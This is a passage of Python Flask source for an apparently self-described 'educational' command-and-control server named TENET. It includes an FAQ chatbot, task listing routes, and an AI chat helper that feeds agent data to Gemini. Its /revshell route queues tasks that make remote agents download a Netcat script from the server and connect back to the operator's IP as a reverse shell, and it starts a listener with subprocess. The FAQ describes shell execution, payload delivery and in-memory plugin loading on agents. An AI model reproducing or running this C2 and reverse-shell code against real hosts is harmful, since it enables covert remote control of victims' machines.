                    (log_uuid, current_time, "None", log_message, "Critical", "None")
                )
                db.commit()

@app.route("/chat", methods=["POST"])
def chat():
    FAQ = {
        "What is the TENET?":
            "TENET is a Flask-based command-and-control style server for managing remote agents, dispatching tasks, receiving results, and monitoring agents in real time. Intended for educational and controlled automation environments only.",

        "How does encrypted communication work?":
            "Agents communicate using Fernet symmetric encryption to securely transmit beacons and task results. An API key is required for privileged operations.",

        "What kind of agents can I create?":
            "Agents can be created directly from the dashboard, requiring an ID, username, and password. They are stored in SQLite and assigned a default role 'agent'.",

        "How are agents stored and managed?":
            "Agents are stored in an SQLite database with persistent information, and can be monitored and updated via the dashboard.",

        "Which database does the server use?":
            "The server uses SQLite to store agents, tasks, users, and related data. It is lightweight and survives server restarts.",

        "Can I monitor agents in real time?":
            "Yes, the dashboard displays all connected agents with hostname, OS, username, IP, and last seen timestamp. Online/offline status is updated automatically.",

        "How do I upload files to agents?":
            "Files can be uploaded from the dashboard. Agents can download, store, or execute these files locally.",

        "How does the dual authentication system work?":
            "Admins use username/password to access the dashboard. Agents use token-based authentication issued after login for secure communication.",

        "How are plugins loaded and executed?":
            "Python modules can be dynamically loaded and executed in-memory on agents, without redeployment, allowing modular and rapid operations.",

        "What is the folder structure of the project?":
            "The project includes C2.py (server), c2.db (SQLite), upload/ (files), plugins/ (modules), templates/ (HTML), and static/ (CSS/JS).",

        "What is beaconing and how does it work?":
            "Agents periodically send encrypted POST requests to /beacon. The server decrypts the payload, updates last_seen, marks them online, and returns pending tasks.",

        "How are tasks dispatched to agents?":
            "Tasks are stored in SQLite and delivered to agents when they beacon. Agents receive and execute tasks as soon as they check in.",

        "What types of tasks are supported?":
            "Supported task types include 'shell' (command execution), 'download' (fetch files), 'upload' (send files), 'sleep' (adjust beacon interval), and 'plugin' execution.",

        "How do agents submit task results?":
            "Agents POST encrypted results to /result. The server decrypts the data, stores output in the database, and marks the task as completed.",

        "What can I do from the admin dashboard?":
            "Admins can view live agents, manage tasks, upload/download files, execute plugins, create new agents, and monitor activity in real time.",

        "Can you give examples of agent payloads?":
            "Examples include JSON beacon payloads with agent info and task payloads for shell commands or plugin downloads.",

        "How do I run the server locally?":
            "Install dependencies with 'pip install -r requirements.txt', set the API_KEY environment variable, and start with 'python app.py'. Server runs at http://0.0.0.0:5000.",

        "What security measures should I follow?":
            "All communication is encrypted (Fernet), API key is required for sensitive actions, passwords should be hashed, plugin execution should be restricted, and HTTPS is recommended.",

        "Are there future improvements planned for the project?":
            "Potential improvements include role-based access control, agent grouping, WebSocket live updates, audit logs, a payload builder, and Docker deployment."
    }
    data = request.json
    user_message = data.get("message", "").strip()
    if not user_message:
        return jsonify({"reply": "Please ask a question."})

    # Normalize text: lowercase, remove punctuation, strip spaces
    def normalize(text):
        return text.lower().translate(str.maketrans('', '', string.punctuation)).strip()

    normalized_input = normalize(user_message)

    # Prepare normalized FAQ dictionary
    normalized_faq = {normalize(k): v for k, v in FAQ.items()}

    # Exact match first
    answer = normalized_faq.get(normalized_input)

    # Fuzzy match if no exact match
    if not answer:
        matches = difflib.get_close_matches(normalized_input, list(normalized_faq.keys()), n=1, cutoff=0.6)
        if matches:
            answer = normalized_faq[matches[0]]

    # Fallback if no match
    if not answer:
        answer = "Sorry, I don't have an answer for that. Please check our FAQ page."

    # Save conversation in session (optional, for multi-turn display)
    conversation = session.get("conversation", [])
    conversation.append({"role": "user", "content": user_message})
    conversation.append({"role": "assistant", "content": answer})
    session["conversation"] = conversation

    return jsonify({"reply": answer})


@app.route("/tasks-data")
@require_token(role="admin")
def tasks_data():
    if "username" not in session:
        return jsonify({"error": "Unauthorized"}), 401

    db = get_db()

    rows = db.execute("""
        SELECT uuid, agent_id, task_json, output ,executed_at,scheduled_at,recurring_every,status
        FROM tasks
        ORDER BY rowid DESC
    """).fetchall()

    tasks_dict = {}
    for t in rows:

        if t["scheduled_at"] is None:
            formatted_data = "N/A"
        else:
            iso_string = str(t["scheduled_at"]).replace("Z", "+00:00")

            dt_object = datetime.fromisoformat(iso_string)
            formatted_data = dt_object.strftime("%#m/%#d/%Y, %#I:%M:%S %p")

        if t["recurring_every"] is None:
            rec = "N/A"
        else:
            rec=t["recurring_every"]

        tasks_dict[str(t["uuid"])] = {
            "agent_id": t["agent_id"],
            "task": json.loads(t["task_json"]),
            "output": t["output"],
            "executed_at": t["executed_at"],
            "scheduled_at": formatted_data,
            "recurring_every": rec,
            "status": t["status"],
        }


    return jsonify(tasks_dict)

@app.route('/tasks/')
@require_token(role="admin")
def tasks_list():
    if "username" not in session:
        return redirect(url_for("login"))

    db = get_db()
    rows = db.execute("""
        SELECT uuid, agent_id, task_json, output
        FROM tasks
        ORDER BY rowid DESC
    """).fetchall()

    tasks_str = {}
    for t in rows:
        tasks_str[str(t["uuid"])] = {
            "agent_id": t["agent_id"],
            "task": json.loads(t["task_json"]),
            "output": t["output"]
        }

    # Pass API_KEY to template
    return render_template('tasks.html', tasks=tasks_str, api_key=API_KEY)

# Task Delete
@app.route('/tasks/<task_uuid>', methods=['DELETE'])
@require_token(role="admin")
def delete_task(task_uuid):
    auth_header = request.headers.get("Authorization")
    if auth_header != f"Bearer {API_KEY}":
        return jsonify({"error": "Unauthorized"}), 401

    db = get_db()
    db.execute("DELETE FROM tasks WHERE uuid = ?", (task_uuid,))
    db.commit()
    return jsonify({"status": "deleted"})

@app.route('/tools/<filename>')
def tools_file(filename):
    return send_from_directory(app.config['TOOLS_FOLDER'], filename)

@app.route('/revshell',methods=['POST'])
def revshell():
    #Gets request from browser
    netcat_url = f"https://{IP}/tools/Netcat.py"
    agent_id = request.json.get("agent_id")
    port = request.json.get("port")
    host_os = request.json.get("host_os")
    agent_os = request.json.get("agent_os")
    task_uuid = str(uuid.uuid4())
    current_time = datetime.now(timezone.utc)
    if port and agent_id:
        db = get_db()
        db.execute("""
            INSERT INTO tasks (uuid, agent_id, task_json, output, scheduled_at, recurring_every)
            VALUES (?, ?, ?, NULL, ?, NULL)
        """, (task_uuid, agent_id, json.dumps({"type": "download", "url": netcat_url}),current_time))
        db.commit()
    else:
        return jsonify({"Error": "Missing Parameters"}), 401
    rev_dir = rev_dir = BASE_DIR / "tools" / "Netcat.py"
    rev_cmd_win = f'py "{rev_dir}" -l -p {port}'
    rev_cmd_lin = f'python3 "{rev_dir}" -l -p {port}'
    host_cmd = ""
    guest_cmd = ""
    if (host_os=="windows"):
        host_cmd = f'start cmd /k "{rev_cmd_win}"'
    else:
        host_cmd = f'qterminal -e "{rev_cmd_lin}"'
    guest_os = ""
    if (guest_os=="windows"):
        guest_cmd = f"py Netcat.py -t {IP} -p {port}"
    else:
        guest_cmd = f"python3 Netcat.py -t {IP} -p {port}"
    # Use start cmd to open new terminal window
    subprocess.Popen(
        host_cmd,
        shell=True
    )
    time.sleep(3)
    task_uuid = str(uuid.uuid4())
    db = get_db()

    db.execute("""
        INSERT INTO tasks (uuid, agent_id, task_json, output, scheduled_at, recurring_every)
        VALUES (?, ?, ?, NULL, ?, NULL)
    """, (task_uuid, agent_id, json.dumps({"type": "shell", "command": guest_cmd}),current_time))
    db.commit()

    log_uuid = str(uuid.uuid4())
    current_time = datetime.now(timezone.utc)
    db = get_db()
    db.execute(
        "INSERT INTO logs (log_id, timestamp, role, log_message, alert_level,task_id) VALUES (?, ?, ?, ?, ?, ?)",
        (log_uuid, current_time, "administrator", f"Created a new Reverse shell", "Critical",task_uuid))
    db.commit()

    return jsonify({"status": "executed"})

def ask_ai(user_message, context):
    prompt = f"""
    {SYSTEM_PROMPT}

    Context:
    {context}

    User:
    {user_message}
    """
    print("prompt:",prompt)
    response = client.models.generate_content(
        model="gemini-2.5-flash-lite",
        contents=prompt
    )

    return response.text

def build_context(db):
    agents = db.execute("""
        SELECT id, hostname, user, ip, last_seen, agent_group
        FROM agents
        LIMIT 20
    """).fetchall()

    alerts = db.execute("""
        SELECT timestamp, role, log_message, alert_level
        FROM logs
        ORDER BY timestamp DESC
        LIMIT 10
    """).fetchall()

    tasks = db.execute("""
        SELECT task_json, output, scheduled_at, recurring_every, status
        FROM tasks
        ORDER BY scheduled_at DESC
        LIMIT 10
    """).fetchall()


    return {
        "agents": [dict(r) for r in agents],
        "alerts": [dict(r) for r in alerts],
        "recent_tasks": [dict(r) for r in tasks]
    }

@app.route("/ai/chat", methods=["POST"])
def ai_chat():
    data = request.get_json()
    user_message = data.get("message")
    db = get_db()

    if not user_message:
        return jsonify({"error": "Missing message"}), 400

    try:
        # 1. Build context
        context = build_context(db)

        # 2. Ask AI
        ai_response = ask_ai(user_message, context)

        # 3. Try to extract suggestion (optional)
        suggestion = None

        if "suggestion" in ai_response:
            # naive parse (you can improve with json.loads + validation)
            suggestion = ai_response

        return jsonify({
            "reply": ai_response,
            "suggestion": suggestion
        })

    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/chat')
def chat_page():
    return render_template('chat.html')

# --- Main ---
if __name__ == "__main__":
    restart_recurring_tasks(app)
    app.run(host="0.0.0.0", port=PORT,use_reloader=False)